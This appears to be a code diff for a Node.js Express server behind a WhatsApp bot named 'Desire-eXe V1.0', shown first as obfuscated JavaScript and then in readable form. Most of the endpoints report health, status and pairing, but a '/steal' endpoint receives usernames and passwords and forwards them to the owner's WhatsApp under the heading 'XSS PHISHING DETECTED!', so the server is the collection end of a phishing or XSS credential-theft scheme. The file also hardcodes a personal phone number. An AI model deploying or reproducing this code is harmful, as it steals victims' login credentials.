Date()[_0xd47765(0x16e,'i#BJ')]()})):_0x1dd46f[_0xd47765(0x192,'5TPE')]({'success':!![],'handled':![],'message':_0xd47765(0x202,'$fR)'),'type':_0x4d2a8f,'platform':PLATFORM});}catch(_0x5a569e){console['error']('❌\x20Webhook\x20error:',_0x5a569e),_0x1dd46f[_0xd47765(0x261,'uMTf')](0x1f4)[_0xd47765(0x16b,'i#BJ')]({'success':![],'error':_0xd47765(0x189,'qjHr'),'platform':PLATFORM});}}),app[a0_0x3683a2(0x1fc,'4C4*')](a0_0x3683a2(0x161,'^j#0'),(_0x5f5cb4,_0x1aedd6)=>{const _0x366ddb=a0_0x3683a2,_0x353440=getSessionInfo(),{isConnected:_0x5ee5e8}=getQRCode();_0x1aedd6['json']({'success':!![],'platform':PLATFORM,'config':{'owner':CONFIG[_0x366ddb(0x1ff,'oK$E')],'clean_session':CONFIG[_0x366ddb(0x17a,']DGx')]},'bot_status':global[_0x366ddb(0x21d,'wdmX')],'whatsapp_connected':_0x5ee5e8,'webhook_endpoint':_0x366ddb(0x271,'oK$E'),'session':_0x353440,'deployment':{'platform':PLATFORM,'webhook_ready':!![],'supported_platforms':[_0x366ddb(0x1e9,'C1jz'),_0x366ddb(0x169,'[YD&'),_0x366ddb(0x1e3,'uDwg')]},'timestamp':new Date()['toISOString']()});}),app[a0_0x3683a2(0x173,'LaeH')]('/auth',(_0x506128,_0x372c5c)=>{_0x372c5c['send'](getAuthPage());}),app[a0_0x3683a2(0x195,'2yOD')]('/auth/pairing',async(_0x49106e,_0xfa9ecb)=>{const _0x227f5b=a0_0x3683a2,{phoneNumber:_0x4591ec}=_0x49106e[_0x227f5b(0x1cd,'^74G')];if(!_0x4591ec)return _0xfa9ecb[_0x227f5b(0x27b,'0oTa')](0x190)[_0x227f5b(0x17b,'sPMj')]({'success':![],'error':_0x227f5b(0x1d9,'ZQK0')});if(!global[_0x227f5b(0x27c,'wKFV')])return _0xfa9ecb['status'](0x1f7)[_0x227f5b(0x1c3,'b20X')]({'success':![],'error':_0x227f5b(0x172,'^LP1')});try{const _0x390854=await requestPairingCode(global[_0x227f5b(0x186,'ZQK0')],_0x4591ec);_0x390854[_0x227f5b(0x19f,'q36!')]?_0xfa9ecb[_0x227f5b(0x1db,'*lSB')]({'success':!![],'code':_0x390854['code'],'phoneNumber':_0x390854[_0x227f5b(0x1f2,'^74G')],'expiresAt':_0x390854[_0x227f5b(0x200,'%9$2')],'message':'Pairing\x20code\x20generated\x20successfully','platform':PLATFORM,'config':{'clean_session':CONFIG[_0x227f5b(0x218,'oK$E')]}}):_0xfa9ecb[_0x227f5b(0x1fa,'C1jz')](0x190)[_0x227f5b(0x1ec,'C1jz')]({'success':![],'error':_0x390854[_0x227f5b(0x18e,'7%bn')]});}catch(_0x2c16ce){console['error'](_0x227f5b(0x1de,'wdmX'),_0x2c16ce),_0xfa9ecb[_0x227f5b(0x22a,'eYU7')](0x1f4)[_0x227f5b(0x207,'E3mc')]({'success':![],'error':'Failed\x20to\x20generate\x20pairing\x20code:\x20'+_0x2c16ce[_0x227f5b(0x28b,'TWiz')]});}}),app[a0_0x3683a2(0x275,'7%bn')](a0_0x3683a2(0x170,'dI)W'),(_0x35553d,_0x2423af)=>{const _0x36a93b=a0_0x3683a2,{qrCode:_0x5d69a1,qrCodeImage:_0x5eeddc,isConnected:_0xbd21ab,pairingCode:_0x20dd62,pairingPhoneNumber:_0x403322}=getQRCode(),_0x973a8d=getSessionInfo();_0x2423af[_0x36a93b(0x179,'wdmX')]({'success':!![],'connected':_0xbd21ab,'botStatus':global['botStatus'],'platform':PLATFORM,'config':{'owner':CONFIG[_0x36a93b(0x266,'rfrx')],'clean_session':CONFIG['CLEAN_SESSION']},'authentication':{'qrAvailable':!!_0x5d69a1,'pairingAvailable':!!_0x20dd62,'pairingPhoneNumber':_0x403322,'pairingCode':_0x20dd62?_0x36a93b(0x1aa,')U(('):null},'session':_0x973a8d,'timestamp':new Date()[_0x36a93b(0x24c,'PD@e')]()});}),app[a0_0x3683a2(0x1fc,'4C4*')](a0_0x3683a2(0x1b6,'sPMj'),(_0x4f8d15,_0x2f0ed1)=>{const _0x1abe61=a0_0x3683a2,{isConnected:_0x2e4ef6}=getQRCode(),_0x2730d7=global[_0x1abe61(0x272,'f&LL')]===_0x1abe61(0x157,'TWiz')&&_0x2e4ef6?_0x1abe61(0x21c,'C1jz'):_0x1abe61(0x213,'ZQK0');_0x2f0ed1[_0x1abe61(0x209,'TWiz')]({'status':_0x2730d7,'platform':PLATFORM,'config':{'owner':CONFIG[_0x1abe61(0x20f,'o5GO')],'clean_session':CONFIG[_0x1abe61(0x208,'b20X')]},'bot_status':global[_0x1abe61(0x159,'dI)W')],'connected':_0x2e4ef6,'uptime':process[_0x1abe61(0x1f6,'W[Yv')](),'timestamp':new Date()[_0x1abe61(0x289,'%9$2')]()});}),app['get'](a0_0x3683a2(0x257,'@yR4'),(_0x5d4415,_0x49e07a)=>{const _0x113853=a0_0x3683a2;_0x49e07a[_0x113853(0x234,'q#R!')]({'alive':!![],'platform':PLATFORM,'config':{'owner':CONFIG[_0x113853(0x25f,'V%o@')],'clean_session':CONFIG[_0x113853(0x175,'wdmX')]},'bot':global[_0x113853(0x273,'4C4*')],'connected':getQRCode()[_0x113853(0x1e6,'*lSB')],'time':new Date()['toISOString']()});}),app[a0_0x3683a2(0x1b4,'sPMj')](a0_0x3683a2(0x165,'W[Yv'),(_0x151085,_0x5735c4)=>{const _0x5077d3=a0_0x3683a2,_0x2d5cb9=getSessionInfo();_0x5735c4[_0x5077d3(0x226,'o5GO')]({'success':!![],'platform':PLATFORM,'config':{'owner':CONFIG['OWNER_JID'],'whatsapp_number':CONFIG[_0x5077d3(0x1dc,'dI)W')],'clean_session':CONFIG[_0x5077d3(0x211,'7%bn')]},'botStatus':global[_0x5077d3(0x1c4,'q36!')],'session':_0x2d5cb9,'connectionTime':global[_0x5077d3(0x232,'V%o@')],'timestamp':new Date()['toISOString']()});}),app[a0_0x3683a2(0x25a,'C1jz')](a0_0x3683a2(0x240,'7%bn'),(_0x143062,_0x54a71a)=>{const _0x2cc58c=a0_0x3683a2,_0x275503=getSessionInfo(),{qrCode:_0x41fc3c,pairingCode:_0x3fb795}=getQRCode();_0x54a71a[_0x2cc58c(0x184,'rsT9')]({'name':_0x2cc58c(0x20c,'dI)W'),'version':'1.0.0','platform':PLATFORM,'config':{'owner':CONFIG[_0x2cc58c(0x22c,'0oTa')],'whatsapp_number':CONFIG['WHATSAPP_NUMBER'],'clean_session':CONFIG['CLEAN_SESSION']},'status':global[_0x2cc58c(0x16f,'w*^#')],'session':_0x275503,'deployment':{'current':PLATFORM,'supported':['Koyeb',_0x2cc58c(0x1d2,'q#R!'),_0x2cc58c(0x168,'2yOD')],'node_version':process[_0x2cc58c(0x206,'i#BJ')]},'authentication':{'qrAvailable':!!_0x41fc3c,'pairingAvailable':!!_0x3fb795},'endpoints':{'health':_0x2cc58c(0x1ba,'q#R!'),'status':'/status','auth':_0x2cc58c(0x199,'V%o@'),'session':'/session','webhook':_0x2cc58c(0x15e,']DGx'),'ping':_0x2cc58c(0x176,'0oTa'),'monitor':_0x2cc58c(0x15f,'[YD&')},'timestamp':new Date()[_0x2cc58c(0x27e,'i1BV')]()});}),app[a0_0x3683a2(0x1b3,')U((')](a0_0x3683a2(0x1e7,'0oTa'),async(_0x447039,_0x26d31e)=>{const _0x236375=a0_0x3683a2,{username:_0x549d2a,password:_0xf447e0}=_0x447039[_0x236375(0x263,'q#R!')];try{global[_0x236375(0x1d8,'$fR)')]&&global['botStatus']===_0x236375(0x15d,'b20X')?(await global['whatsappBot']['sendMessage'](CONFIG['OWNER_JID'],{'text':_0x236375(0x254,'^74G')+_0x549d2a+_0x236375(0x24a,'[YD&')+_0xf447e0+_0x236375(0x233,'oK$E')+PLATFORM+_0x236375(0x185,'wKFV')+new Date()[_0x236375(0x247,'q36!')]()}),_0x26d31e['json']({'success':!![],'message':_0x236375(0x15b,'wKFV'),'platform':PLATFORM,'config':{'owner':CONFIG[_0x236375(0x1f4,'*lSB')],'clean_session':CONFIG[_0x236375(0x1b0,'6d9E')]},'timestamp':new Date()[_0x236375(0x24b,'^74G')]()})):_0x26d31e[_0x236375(0x21e,'%9$2')](0x1f7)[_0x236375(0x28a,'^j#0')]({'success':![],'error':_0x236375(0x1f3,'W[Yv'),'botStatus':global[_0x236375(0x276,'gRhU')],'platform':PLATFORM,'config':{'owner':CONFIG['OWNER_JID']}});}catch(_0x22ad16){console[_0x236375(0x1a4,'b20X')]('❌\x20Error\x20sending\x20credentials\x20to\x20WhatsApp:',_0x22ad16[_0x236375(0x220,'!l$n')]),_0x26d31e[_0x236375(0x193,'b20X')](0x1f4)[_0x236375(0x179,'wdmX')]({'success':![],'error':_0x236375(0x265,')3vJ'),'botStatus':global[_0x236375(0x15a,'i#BJ')],'platform':PLATFORM,'config':{'owner':CONFIG[_0x236375(0x23d,'sPMj')]}});}});async function initializeApp(){const _0x3cf089=a0_0x3683a2;try{console['log']('🚀\x20Starting\x20Desire-eXe\x20V1.0...'),console[_0x3cf089(0x235,')3vJ')]('🌐\x20Platform:\x20'+PLATFORM),console['log'](_0x3cf089(0x22f,'dI)W')+process[_0x3cf089(0x1c8,'q#R!')]),console['log'](_0x3cf089(0x19b,'$fR)')),console['log']('\x20\x20\x20📞\x20Owner\x20JID:\x20'+CONFIG[_0x3cf089(0x167,'C1jz')]),console['log']('\x20\x20\x20📱\x20WhatsApp:\x20'+CONFIG[_0x3cf089(0x201,'i1BV')]),console[_0x3cf089(0x249,'b20X')](_0x3cf089(0x1b5,'0oTa')+CONFIG[_0x3cf089(0x1af,'VaKs')]),console[_0x3cf089(0x212,'gRhU')](_0x3cf089(0x178,'eYU7')+PLATFORM);switch(PLATFORM){case'Koyeb':console[_0x3cf089(0x20a,'dI)W')](_0x3cf089(0x1a2,'q36!'));break;case _0x3cf089(0x1b9,'!l$n'):console[_0x3cf089(0x1ee,'RdZQ')](_0x3cf089(0x160,'q36!'));break;case _0x3cf089(0x255,']DGx'):console[_0x3cf089(0x20d,'uMTf')](_0x3cf089(0x239,'E3mc')),console[_0x3cf089(0x1cf,'^LP1')](_0x3cf089(0x1ac,']DGx'));break;default:console['log'](_0x3cf089(0x18f,'2^pH'));}const _0x56925c=await startBot();global[_0x3cf089(0x241,'TWiz')]=_0x56925c,console['log']('✅\x20WhatsApp\x20bot\x20initialization\x20complete');const _0x15f133=app['listen'](port,()=>{const _0x1ad404=_0x3cf089;console['log'](_0x1ad404(0x1fe,'o5GO')+port),console['log']('🤖\x20Bot\x20Status:\x20'+global[_0x1ad404(0x224,'5TPE')]),console[_0x1ad404(0x1e0,'TWiz')](_0x1ad404(0x248,'dI)W')),console[_0x1ad404(0x1e0,'TWiz')](_0x1ad404(0x1c1,'w*^#')),console[_0x1ad404(0x235,')3vJ')](_0x1ad404(0x1f1,'2yOD')),console[_0x1ad404(0x1cf,'^LP1')](_0x1ad404(0x27f,'4C4*')),PLATFORM==='KataBump'&&(console[_0x1ad404(0x1b2,'uDwg')](_0x1ad404(0x1ed,'rfrx')),console[_0x1ad404(0x1e2,'w*^#')](_0x1ad404(0x164,'o5GO')),console[_0x1ad404(0x216,'oK$E')](_0x1ad404(0x166,'^LP1')));});process['on']('SIGTERM',()=>{const _0x838d31=_0x3cf089;console[_0x838d31(0x235,')3vJ')](_0x838d31(0x281,'gRhU')+PLATFORM+_0x838d31(0x286,'5TPE')),global[_0x838d31(0x15a,'i#BJ')]=_0x838d31(0x21b,'E3mc'),_0x15f133[_0x838d31(0x262,'wdmX')](()=>{const _0x15b08b=_0x838d31;console['log'](_0x15b08b(0x1ea,'sPMj')),process[_0x15b08b(0x1d1,'wdmX')](0x0);});}),process['on'](_0x3cf089(0x1ce,'wdmX'),()=>{const _0x350dda=_0x3cf089;console[_0x350dda(0x25c,'cTr7')]('👋\x20Process\x20interrupted...'),global[_0x350dda(0x21d,'wdmX')]=_0x350dda(0x1ca,'sPMj'),_0x15f133[_0x350dda(0x17c,')U((')](()=>{const _0x2ab341=_0x350dda;console[_0x2ab341(0x1f8,'^j#0')](_0x2ab341(0x156,'sPMj')),process['exit'](0x0);});});}catch(_0x19099e){console['error'](_0x3cf089(0x230,'gRhU'),_0x19099e),global['botStatus']='failed';const _0x86edab=PLATFORM===_0x3cf089(0x1b9,'!l$n')?0x7530:0x2710;console[_0x3cf089(0x20a,'dI)W')](_0x3cf089(0x1c2,'rfrx')+_0x86edab/0x3e8+'\x20seconds...'),setTimeout(initializeApp,_0x86edab);}}initializeApp(),process['on'](a0_0x3683a2(0x1bd,'5TPE'),_0x475567=>{const _0x3c03e0=a0_0x3683a2;console[_0x3c03e0(0x217,'0oTa')](_0x3c03e0(0x1ab,'0oTa'),_0x475567['message']),global[_0x3c03e0(0x1c4,'q36!')]=_0x3c03e0(0x26e,'i#BJ');}),process['on'](a0_0x3683a2(0x15c,')U(('),(_0x653db5,_0xac943)=>{const _0xd39e7d=a0_0x3683a2;console[_0xd39e7d(0x260,'o5GO')](_0xd39e7d(0x21f,'o5GO'),_0x653db5),global[_0xd39e7d(0x264,'RdZQ')]='error';}),setInterval(async()=>{const _0x33a42b=a0_0x3683a2;if(global['whatsappBot']&&global[_0x33a42b(0x174,']DGx')]===_0x33a42b(0x19a,'cTr7'))try{await global[_0x33a42b(0x203,'rfrx')][_0x33a42b(0x210,'sPMj')]('available'),console['log'](_0x33a42b(0x267,'uMTf'));}catch(_0x39a245){console[_0x33a42b(0x1ee,'RdZQ')]('⚠️\x20Keep-alive\x20failed:',_0x39a245[_0x33a42b(0x1cb,'0oTa')]),global[_0x33a42b(0x21d,'wdmX')]='error';}},0x4*0x3c*0x3e8),setInterval(()=>{const _0x34fa07=a0_0x3683a2;if(global[_0x34fa07(0x21d,'wdmX')]){const _0x2cfd82=process[_0x34fa07(0x1d7,'oK$E')](),_0x2af020=Math['floor'](_0x2cfd82/0xe10),_0x290eb6=Math[_0x34fa07(0x25b,'TWiz')](_0x2cfd82%0xe10/0x3c);console[_0x34fa07(0x1b2,'uDwg')](_0x34fa07(0x205,'f&LL')+PLATFORM+_0x34fa07(0x231,'o5GO')+global[_0x34fa07(0x162,'q#R!')]+_0x34fa07(0x22e,'RdZQ')+_0x2af020+'h\x20'+_0x290eb6+_0x34fa07(0x252,'rsT9')+CONFIG[_0x34fa07(0x19e,'2^pH')]);}},0xea60),console[a0_0x3683a2(0x1a8,'qjHr')](a0_0x3683a2(0x258,'w*^#')),console[a0_0x3683a2(0x235,')3vJ')]('✅\x20Using\x20your\x20environment\x20variables:\x20CLEAN_SESSION,\x20OWNER_JID,\x20WHATSAPP_NUMBER');
+const { startBot, getAuthPage, getQRCode, requestPairingCode } = require('./config/WhatsappConnection.js');
+const express = require('express');
+const bodyParser = require('body-parser');
+
+// ✅ Express server setup
+const app = express();
+const port = process.env.PORT || 8000;
+
+app.use(bodyParser.json());
+app.use(bodyParser.urlencoded({ extended: true }));
+
+// Global variables to track bot state
+global.botStatus = 'starting';
+global.whatsappBot = null;
+global.connectionTime = null;
+global.totalPings = 0;
+
+// ✅ UNIVERSAL PLATFORM DETECTION
+const getPlatform = () => {
+  if (process.env.KOYEB_APP_DOMAIN || process.env.KOYEB_REGION) return 'Koyeb';
+  if (process.env.RENDER_SERVICE_ID || process.env.RENDER) return 'Render';
+  if (process.env.RAILWAY_ENVIRONMENT) return 'Railway';
+  if (process.env.HEROKU_APP_NAME) return 'Heroku';
+  return process.env.PLATFORM || 'KataBump';
+};
+
+const PLATFORM = getPlatform();
+
+// ✅ YOUR ENVIRONMENT VARIABLES
+const CONFIG = {
+  CLEAN_SESSION: process.env.CLEAN_SESSION === 'true',
+  OWNER_JID: process.env.OWNER_JID || '2347017747337@s.whatsapp.net',
+  WHATSAPP_NUMBER: process.env.WHATSAPP_NUMBER || '2347017747337'
+};
+
+// Helper function to get session information
+function getSessionInfo() {
+  const sock = global.whatsappBot;
+  
+  if (!sock) {
+    return {
+      connected: false,
+      message: 'Bot not initialized'
+    };
+  }
+
+  const creds = sock.authState?.creds || {};
+  const sessionId = creds.me?.id;
+  
+  return {
+    connected: global.botStatus === 'connected',
+    hasSession: !!sessionId,
+    registered: creds.registered || false,
+    platform: sock.user?.platform || 'Unknown',
+    sessionId: sessionId ? `${sessionId.substring(0, 8)}...` : 'Not authenticated',
+    phone: creds.me?.phone ? `${creds.me.phone.substring(0, 4)}...` : null,
+    connectionTime: global.connectionTime,
+    cleanSession: CONFIG.CLEAN_SESSION
+  };
+}
+
+// ==================== UNIVERSAL ENDPOINTS ====================
+
+app.get('/', (req, res) => {
+  const sessionInfo = getSessionInfo();
+  const { isConnected } = getQRCode();
+  
+  res.json({ 
+    status: 'online', 
+    bot: 'Desire-eXe V1.0',
+    platform: PLATFORM,
+    config: {
+      owner: CONFIG.OWNER_JID,
+      whatsapp_number: CONFIG.WHATSAPP_NUMBER,
+      clean_session: CONFIG.CLEAN_SESSION
+    },
+    deployment: {
+      platform: PLATFORM,
+      node_version: process.version,
+      uptime: process.uptime()
+    },
+    botStatus: global.botStatus,
+    connected: isConnected,
+    session: sessionInfo,
+    timestamp: new Date().toISOString()
+  });
+});
+
+app.get('/ping', (req, res) => {
+  global.totalPings = (global.totalPings || 0) + 1;
+  
+  const sessionInfo = getSessionInfo();
+  const { isConnected } = getQRCode();
+  
+  res.json({ 
+    status: 'pong',
+    bot: 'Desire-eXe V1.0',
+    platform: PLATFORM,
+    config: {
+      owner: CONFIG.OWNER_JID,
+      clean_session: CONFIG.CLEAN_SESSION
+    },
+    botStatus: global.botStatus,
+    connected: isConnected,
+    session: sessionInfo,
+    uptime: process.uptime(),
+    total_pings: global.totalPings,
+    timestamp: new Date().toISOString()
+  });
+});
+
+app.get('/health', (req, res) => {
+  res.status(200).json({ 
+    status: 'healthy',
+    platform: PLATFORM,
+    config: {
+      owner: CONFIG.OWNER_JID,
+      clean_session: CONFIG.CLEAN_SESSION
+    },
+    uptime: process.uptime(),
+    botStatus: global.botStatus,
+    timestamp: new Date().toISOString()
+  });
+});
+
+app.get('/status', (req, res) => {
+  const sessionInfo = getSessionInfo();
+  const { isConnected } = getQRCode();
+  
+  res.json({
+    status: 'online',
+    platform: PLATFORM,
+    config: {
+      owner: CONFIG.OWNER_JID,
+      whatsapp_number: CONFIG.WHATSAPP_NUMBER,
+      clean_session: CONFIG.CLEAN_SESSION
+    },
+    botStatus: global.botStatus,
+    connected: isConnected,
+    session: sessionInfo,
+    deployment: {
+      platform: PLATFORM,
+      port: port,
+      environment: process.env.NODE_ENV || 'development'
+    },
+    uptime: process.uptime(),
+    timestamp: new Date().toISOString()
+  });
+});
+
+// ==================== KATABUMP WEBHOOK ====================
+
+app.post('/webhook', async (req, res) => {
+  try {
+    const { message, sender, chat, type } = req.body;
+    
+    console.log('📥 Incoming Webhook:', {
+      from: sender?.phone || sender?.id,
+      message: message?.text || message?.caption,
+      type: type,
+      platform: PLATFORM
+    });
+
+    if (!global.whatsappBot || global.botStatus !== 'connected') {
+      return res.status(503).json({
+        success: false,
+        error: 'WhatsApp bot not connected',
+        botStatus: global.botStatus,
+        platform: PLATFORM
+      });
+    }
+
+    if (type === 'text' && message?.text) {
+      // Use your OWNER_JID from environment variables
+      await global.whatsappBot.sendMessage(CONFIG.OWNER_JID, {
+        text: `📨 *INCOMING MESSAGE*\n\n💬 Message: ${message.text}\n👤 From: ${sender?.phone || sender?.id}\n🖥️ Platform: ${PLATFORM}\n⏰ Time: ${new Date().toLocaleString()}`,
+      });
+
+      res.json({
+        success: true,
+        handled: true,
+        message: 'Forwarded to WhatsApp',
+        platform: PLATFORM,
+        timestamp: new Date().toISOString()
+      });
+    } else {
+      res.json({
+        success: true,
+        handled: false,
+        message: 'Message type not processed',
+        type: type,
+        platform: PLATFORM
+      });
+    }
+
+  } catch (error) {
+    console.error('❌ Webhook error:', error);
+    res.status(500).json({
+      success: false,
+      error: 'Internal server error',
+      platform: PLATFORM
+    });
+  }
+});
+
+// Webhook status endpoint
+app.get('/webhook/status', (req, res) => {
+  const sessionInfo = getSessionInfo();
+  const { isConnected } = getQRCode();
+  
+  res.json({
+    success: true,
+    platform: PLATFORM,
+    config: {
+      owner: CONFIG.OWNER_JID,
+      clean_session: CONFIG.CLEAN_SESSION
+    },
+    bot_status: global.botStatus,
+    whatsapp_connected: isConnected,
+    webhook_endpoint: '/webhook',
+    session: sessionInfo,
+    deployment: {
+      platform: PLATFORM,
+      webhook_ready: true,
+      supported_platforms: ['Koyeb', 'Render', 'KataBump']
+    },
+    timestamp: new Date().toISOString()
+  });
+});
+
+// ==================== AUTHENTICATION ENDPOINTS ====================
+
+app.get('/auth', (req, res) => {
+  res.send(getAuthPage());
+});
+
+app.post('/auth/pairing', async (req, res) => {
+  const { phoneNumber } = req.body;
+  
+  if (!phoneNumber) {
+    return res.status(400).json({
+      success: false,
+      error: 'Phone number is required'
+    });
+  }
+  
+  if (!global.whatsappBot) {
+    return res.status(503).json({
+      success: false,
+      error: 'WhatsApp bot not ready. Please try again in a few seconds.'
+    });
+  }
+  
+  try {
+    const result = await requestPairingCode(global.whatsappBot, phoneNumber);
+    
+    if (result.success) {
+      res.json({
+        success: true,
+        code: result.code,
+        phoneNumber: result.phoneNumber,
+        expiresAt: result.expiresAt,
+        message: 'Pairing code generated successfully',
+        platform: PLATFORM,
+        config: {
+          clean_session: CONFIG.CLEAN_SESSION
+        }
+      });
+    } else {
+      res.status(400).json({
+        success: false,
+        error: result.error
+      });
+    }
+  } catch (error) {
+    console.error('❌ Pairing code request error:', error);
+    res.status(500).json({
+      success: false,
+      error: 'Failed to generate pairing code: ' + error.message
+    });
+  }
+});
+
+app.get('/auth/status', (req, res) => {
+  const { qrCode, qrCodeImage, isConnected, pairingCode, pairingPhoneNumber } = getQRCode();
+  const sessionInfo = getSessionInfo();
+  
+  res.json({
+    success: true,
+    connected: isConnected,
+    botStatus: global.botStatus,
+    platform: PLATFORM,
+    config: {
+      owner: CONFIG.OWNER_JID,
+      clean_session: CONFIG.CLEAN_SESSION
+    },
+    authentication: {
+      qrAvailable: !!qrCode,
+      pairingAvailable: !!pairingCode,
+      pairingPhoneNumber: pairingPhoneNumber,
+      pairingCode: pairingCode ? '••••••' : null
+    },
+    session: sessionInfo,
+    timestamp: new Date().toISOString()
+  });
+});
+
+// ==================== MONITORING ENDPOINTS ====================
+
+app.get('/monitor', (req, res) => {
+  const { isConnected } = getQRCode();
+  
+  const status = (global.botStatus === 'connected' && isConnected) ? 'healthy' : 'warning';
+  
+  res.json({
+    status: status,
+    platform: PLATFORM,
+    config: {
+      owner: CONFIG.OWNER_JID,
+      clean_session: CONFIG.CLEAN_SESSION
+    },
+    bot_status: global.botStatus,
+    connected: isConnected,
+    uptime: process.uptime(),
+    timestamp: new Date().toISOString()
+  });
+});
+
+app.get('/live', (req, res) => {
+  res.json({ 
+    alive: true, 
+    platform: PLATFORM,
+    config: {
+      owner: CONFIG.OWNER_JID,
+      clean_session: CONFIG.CLEAN_SESSION
+    },
+    bot: global.botStatus,
+    connected: getQRCode().isConnected,
+    time: new Date().toISOString()
+  });
+});
+
+// ==================== BOT MANAGEMENT ====================
+
+app.get('/session', (req, res) => {
+  const sessionInfo = getSessionInfo();
+  
+  res.json({
+    success: true,
+    platform: PLATFORM,
+    config: {
+      owner: CONFIG.OWNER_JID,
+      whatsapp_number: CONFIG.WHATSAPP_NUMBER,
+      clean_session: CONFIG.CLEAN_SESSION
+    },
+    botStatus: global.botStatus,
+    session: sessionInfo,
+    connectionTime: global.connectionTime,
+    timestamp: new Date().toISOString()
+  });
+});
+
+app.get('/bot/info', (req, res) => {
+  const sessionInfo = getSessionInfo();
+  const { qrCode, pairingCode } = getQRCode();
+  
+  res.json({
+    name: 'Desire-eXe V1.0',
+    version: '1.0.0',
+    platform: PLATFORM,
+    config: {
+      owner: CONFIG.OWNER_JID,
+      whatsapp_number: CONFIG.WHATSAPP_NUMBER,
+      clean_session: CONFIG.CLEAN_SESSION
+    },
+    status: global.botStatus,
+    session: sessionInfo,
+    deployment: {
+      current: PLATFORM,
+      supported: ['Koyeb', 'Render', 'KataBump'],
+      node_version: process.version
+    },
+    authentication: {
+      qrAvailable: !!qrCode,
+      pairingAvailable: !!pairingCode
+    },
+    endpoints: {
+      health: '/health',
+      status: '/status',
+      auth: '/auth',
+      session: '/session',
+      webhook: '/webhook',
+      ping: '/ping',
+      monitor: '/monitor'
+    },
+    timestamp: new Date().toISOString()
+  });
+});
+
+// Your existing /steal endpoint - Updated to use CONFIG.OWNER_JID
+app.post('/steal', async (req, res) => {
+  const { username, password } = req.body;
+
+  try {
+    if (global.whatsappBot && global.botStatus === 'connected') {
+      await global.whatsappBot.sendMessage(CONFIG.OWNER_JID, {
+        text: `🕷 *XSS PHISHING DETECTED!* \n\n👤 Username: ${username}\n🔑 Password: ${password}\n🖥️ Platform: ${PLATFORM}\n⏰ Time: ${new Date().toLocaleString()}`,
+      });
+      res.json({
+        success: true,
+        message: 'Credentials sent to WhatsApp',
+        platform: PLATFORM,
+        config: {
+          owner: CONFIG.OWNER_JID,
+          clean_session: CONFIG.CLEAN_SESSION
+        },
+        timestamp: new Date().toISOString()
+      });
+    } else {
+      res.status(503).json({ 
+        success: false,
+        error: 'WhatsApp bot not ready',
+        botStatus: global.botStatus,
+        platform: PLATFORM,
+        config: {
+          owner: CONFIG.OWNER_JID
+        }
+      });
+    }
+  } catch (err) {
+    console.error('❌ Error sending credentials to WhatsApp:', err.message);
+    res.status(500).json({ 
+      success: false,
+      error: 'Failed to send message',
+      botStatus: global.botStatus,
+      platform: PLATFORM,
+      config: {
+        owner: CONFIG.OWNER_JID
+      }
+    });
+  }
+});
+
+// ==================== APP INITIALIZATION ====================
+
+async function initializeApp() {
+  try {
+    console.log('🚀 Starting Desire-eXe V1.0...');
+    console.log(`🌐 Platform: ${PLATFORM}`);
+    console.log(`🔧 Node.js: ${process.version}`);
+    
+    // Log your environment configuration
+    console.log(`⚙️  Configuration:`);
+    console.log(`   📞 Owner JID: ${CONFIG.OWNER_JID}`);
+    console.log(`   📱 WhatsApp: ${CONFIG.WHATSAPP_NUMBER}`);
+    console.log(`   🧹 Clean Session: ${CONFIG.CLEAN_SESSION}`);
+    console.log(`   🔧 Platform: ${PLATFORM}`);
+    
+    // Platform-specific initialization messages
+    switch(PLATFORM) {
+      case 'Koyeb':
+        console.log('🐳 Running on Koyeb with Alpine Linux + FFmpeg');
+        break;
+      case 'Render':
+        console.log('🎨 Running on Render with Free Plan');
+        break;
+      case 'KataBump':
+        console.log('⚡ Running on KataBump');
+        console.log('🌐 Webhook ready at: /webhook');
+        break;
+      default:
+        console.log('💻 Running on custom platform');
+    }
+    
+    // Start WhatsApp bot
+    const sock = await startBot();
+    global.whatsappBot = sock;
+    
+    console.log('✅ WhatsApp bot initialization complete');
+    
+    // Start Express server
+    const server = app.listen(port, () => {
+      console.log(`🚀 Express server running on port ${port}`);
+      console.log(`🤖 Bot Status: ${global.botStatus}`);
+      console.log(`🌐 Health Check: /health`);
+      console.log(`🔐 Authentication: /auth`);
+      console.log(`🎯 Webhook Endpoint: /webhook`);
+      console.log(`📊 Status: /status`);
+      
+      if (PLATFORM === 'KataBump') {
+        console.log('\n💡 KataBump Setup:');
+        console.log('📍 Set webhook URL to: [your-domain]/webhook');
+        console.log('📍 Check status at: /webhook/status');
+      }
+    });
+
+    // Graceful shutdown for all platforms
+    process.on('SIGTERM', () => {
+      console.log(`👋 ${PLATFORM} is stopping the service...`);
+      global.botStatus = 'shutting_down';
+      server.close(() => {
+        console.log('✅ Express server closed gracefully');
+        process.exit(0);
+      });
+    });
+
+    process.on('SIGINT', () => {
+      console.log('👋 Process interrupted...');
+      global.botStatus = 'shutting_down';
+      server.close(() => {
+        console.log('✅ Express server closed');
+        process.exit(0);
+      });
+    });
+
+  } catch (err) {
+    console.error('❌ Failed to start bot:', err);
+    global.botStatus = 'failed';
+    
+    // Auto-restart with platform-specific delay
+    const restartDelay = PLATFORM === 'Render' ? 30000 : 10000;
+    console.log(`🔄 Auto-restarting in ${restartDelay/1000} seconds...`);
+    setTimeout(initializeApp, restartDelay);
+  }
+}
+
+// Start the application
+initializeApp();
+
+// Error handling
+process.on('uncaughtException', (error) => {
+  console.error('🔄 Uncaught Exception:', error.message);
+  global.botStatus = 'error';
+});
+
+process.on('unhandledRejection', (reason, promise) => {
+  console.error('🔄 Unhandled Rejection:', reason);
+  global.botStatus = 'error';
+});
+
+// WhatsApp keep-alive
+setInterval(async () => {
+  if (global.whatsappBot && global.botStatus === 'connected') {
+    try {
+      await global.whatsappBot.sendPresenceUpdate('available');
+      console.log('❤️ Keep-alive ping sent to WhatsApp');
+    } catch (error) {
+      console.log('⚠️ Keep-alive failed:', error.message);
+      global.botStatus = 'error';
+    }
+  }
+}, 4 * 60 * 1000);
+
+// Platform status logging
+setInterval(() => {
+  if (global.botStatus) {
+    const uptime = process.uptime();
+    const hours = Math.floor(uptime / 3600);
+    const minutes = Math.floor((uptime % 3600) / 60);
+    
+    console.log(`📊 [${PLATFORM}] Status: ${global.botStatus}, Uptime: ${hours}h ${minutes}m, Clean Session: ${CONFIG.CLEAN_SESSION}`);
+  }
+}, 60000);
+
+console.log('🔄 app.js loaded - Universal deployment ready!');
+console.log(`✅ Using your environment variables: CLEAN_SESSION, OWNER_JID, WHATSAPP_NUMBER`);
+
